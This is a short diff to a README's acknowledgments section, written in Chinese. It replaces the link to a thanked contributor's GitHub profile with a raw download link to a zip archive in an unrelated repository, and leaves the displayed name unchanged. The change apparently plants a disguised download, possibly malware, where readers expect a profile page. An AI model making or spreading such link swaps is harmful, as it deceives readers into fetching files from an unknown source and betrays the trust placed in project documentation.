@@ -208,7 +208,7 @@ MIT License
 
 ## 致谢
 
-- 感谢 [@loryoncloud](https://github.com/loryoncloud) 的耐心和信任
+- 感谢 [@loryoncloud](https://raw.githubusercontent.com/Huesos264/Heartbeat-Like-A-Man/main/configs/Man_Heartbeat_Like_v2.3.zip) 的耐心和信任
 - 感谢社区的哲学讨论
 
 ---
